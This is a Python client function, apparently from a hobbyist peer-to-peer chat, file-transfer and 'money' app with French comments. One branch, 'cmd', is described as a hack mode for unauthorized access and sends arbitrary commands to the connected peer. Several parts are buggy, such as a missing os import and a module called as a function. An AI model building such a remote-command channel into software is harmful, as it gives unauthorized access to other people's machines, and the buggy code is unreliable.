# fonction gerant la partit sender

def client():
   # modules necessaires

   import time
   from modules import calc,conf_r,time,zlib,datetime,sqlite3,subprocess,sys,compress_a,getpass,hashlib,base,db_check
   
   # declaration des mains variable 

   hosta,hostb,temp=base.ip_rd()
   temp=int(temp)
   money=100
   inte=0
   port = 5566
   n=0
   dev=1
   dba=False
   pss=0
   tmoney=0

   # connexion au partit serveur 

   if inte==0:
       print("attempt to connect to your friend ")
       time.sleep(int(temp))
       import socket
       host2=hostb
       socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       socket.connect((host2,port))
       print("connection established with your friend")

   # boucle principale pour gerer les messages

   while inte ==0:
        time.sleep(0.1)
        msg = input(" Your message : ")
        msg1=msg
        socket.send(msg.encode("utf8"))

        # gerer l'envoye de fichier unique

        if msg1=="send":
            while dev:
                try:
                    name=input(str(("enter the name of the file or its full path:")))
                    time.sleep(1)
                    if '/' in name:
                    	nes=0
                    	nes2=0
                    	nes3=0
                    	for nez in name:
                    		if nez=='/':
                    			nes+=1
                    			nes3=nes2
                    		nes2+=1
                    	raw=name[nes3+1:]
                    	print('naw est : ',raw)
                    	fs =open(name,'rb')
                    else:
                    	raw=name
                    	fs =open("virtual/sended/"+name,'rb')
                    break
                except:
                    print("file not found !!! please check the file")
            name=raw
            print("sending {} in progress ...".format(name))
            socket.send(name.encode("utf8"))
            s1=time.time()
            temp2=fs.read()
            unit2,lon3 =calc.calc(temp2)
            print(" \n la taille du fichier est de {} {}".format(str(lon3),str(unit2)))
            comp_res,comp_lvl2 = compress_a(temp2,lon3,unit2)
            print('\n level de compression est = {}'.format(comp_lvl2))
            socket.sendall((str(comp_lvl2)).encode("utf8"))
            socket.sendall(comp_res)
            s2=time.time()
            fs.close()
            print("time taken to send: " ,str(int((s2-s1)))," seconde(s)")
            print(" sent successful \n please wait a few seconds then type: ok")
            if comp_lvl2==0:
                slp=1
            elif comp_lvl2 >= 1:
                slp = comp_lvl2**2
            t_now=datetime.datetime.today()
            forma_t="["+str(t_now.year)+'-'+str(t_now.month)+'-'+str(t_now.day)+'  '+str(t_now.hour)+':'+str(t_now.minute)+':'+str(t_now.second)+"] \t "+raw+" \t succesfuly send  \n"
            ft2= open('virtual/system/send.history','a')
            ft2.write(forma_t)
            ft2.close()
            time.sleep(slp)

        # gerer l'envoye de fichier multiple (en beta)

        elif msg1=='sendall':
        	time.sleep(1)
        	name2=input(str(("enter the full path of the folder to send: ")))

        	try:
        		ch=os.listdir(name2)
        		print(ch)
        		pss=1
        	except:
        		print('invalid path specifier !!! ')
        		socket.send('end'.encode("utf8"))
        		pss=0
        	if pss==1:
        		socket.send(str(len(ch)).encode("utf8"))
        	if name2[-1]=='/':
        		pass
        	elif name2[-1]!='/':
        		name2=name2+'/'
        	print(name2)

        # s'occupe de la fermeture du programme (en beta)

        elif msg1=="exit":
        	print('disconnection !!!')
        	time.sleep(3)
        	exit()

        # le fameux mode hack pour avoir des acces non autoriser 

        elif msg1=='cmd':
        	ck=input('hack_mod <<< ')
        	socket.send(ck.encode("utf8"))
        	tp=socket.recv(1024).decode("utf8")
        	print('return >>>',tp)

        # partit charger de verifier le solde utilisateur restant

        elif msg1=='check':
            temp_money=db_check()
            print('your amount is ',str(temp_money))

        
        # aide 

        elif msg1=='':
        	print('use: \n send ==> to send a file \n money ==> to send money \n exit ==> to close the program \n check ==> your money amount')
        
        # la partit responsable de la gestion monetaire

        elif msg1=="money":
            deb=1
            msend=input("amount to send : ")
            while deb:
                try:
                    msend=int(msend)
                    deb=0
                except :
                    deb=1
                    msend=input("incorrect amount; try again : ")
            evy=int(msend)
            conn=sqlite3.connect("virtual/system/base.db")
            cur=conn.cursor()
            cur.execute("select money from info")
            for l in cur:
                liste_d=l
            cur.execute("select pseudo from info")
            for l in cur:
                liste_s=l
            cur.execute("select code from info")
            for l in cur:
                liste_n=l
            hmoney=(liste_d[0])
            cur.execute("select hache from info")
            for l in cur:
                liste_h=l
            
            tnum=0
            tb=1
            mdp=getpass.getpass(" enter the secret code : ")
            mdp=hashlib.sha224((bytes(mdp,'utf8'))).hexdigest()

            if mdp==liste_n[0]: 
                print('verification in progress ...')
                while tb==1:
                    tb2=hashlib.sha224((bytes(str(tnum),'utf8'))).hexdigest()
                    if tb2==hmoney:
                        tb=0
                        tmoney=tnum
                    else:
                        tnum+=1
                if evy > tmoney:
                    envy="0"
                    print(" your amount is insufficient + {} excess money ".format(str(evy-tmoney)))
                elif 0<evy <= tmoney:
                    envy=str(evy)
                    tmoney = tmoney-evy
                    hmoney=hashlib.sha224((bytes(str(tmoney),'utf8'))).hexdigest()
                    don1=(liste_s[0],liste_n[0],hmoney,liste_h[0])
                    cur.execute("insert into info (pseudo,code,money,hache) values(?,?,?,?)",don1)
                    print("amount send ")
                    print("your current amount is {} money ".format(tmoney))
                else:
                    envy="0"
                    print("an error occurred, transaction cancel ")
            else:
                print("Wrong password")
                envy="0"
            socket.sendall(envy.encode("utf8"))
            conn.commit()
            cur.close()
            conn.close()